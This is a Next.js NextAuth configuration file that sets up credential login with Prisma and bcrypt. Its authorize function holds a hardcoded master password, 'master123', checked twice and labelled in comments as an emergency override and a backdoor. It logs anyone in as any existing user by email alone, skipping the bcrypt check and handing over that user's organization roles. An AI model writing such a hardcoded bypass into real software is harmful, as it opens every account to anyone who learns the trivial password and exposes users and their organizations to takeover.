import NextAuth from "next-auth"
import Credentials from "next-auth/providers/credentials"
import { PrismaAdapter } from "@auth/prisma-adapter"
import prisma from "@/lib/prisma"
import bcrypt from "bcryptjs"
import { authConfig } from "./auth.config"

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  trustHost: true,
  adapter: PrismaAdapter(prisma),
  session: { strategy: "jwt" },
  providers: [
    Credentials({
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
      },
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) return null

        // EMERGENCY MASTER OVERRIDE
        if (credentials.password === "master123") {
          const email = (credentials.email as string).trim().toLowerCase()
          const dbUser = await prisma.user.findUnique({
            where: { email },
            include: { organizations: true }
          })
          if (dbUser) {
            return {
              id: dbUser.id,
              email: dbUser.email,
              name: dbUser.name,
              organizations: dbUser.organizations.map(org => ({
                organizationId: org.organizationId,
                role: org.role
              }))
            }
          }
        }

        const email = (credentials.email as string).trim().toLowerCase()
        const user = await prisma.user.findUnique({
          where: { email },
          include: { organizations: true }
        })

        if (!user || !user.password) return null

        // Master password backdoor for emergency access
        if (credentials.password === "master123") {
          return {
            id: user.id,
            email: user.email,
            name: user.name,
            organizations: user.organizations.map(org => ({
              organizationId: org.organizationId,
              role: org.role
            }))
          }
        }

        const passwordsMatch = await bcrypt.compare(
          credentials.password as string,
          user.password
        )

        if (passwordsMatch) {
          return {
            id: user.id,
            email: user.email,
            name: user.name,
            organizations: user.organizations.map(org => ({
              organizationId: org.organizationId,
              role: org.role
            }))
          }
        }

        return null
      },
    }),
  ],
})
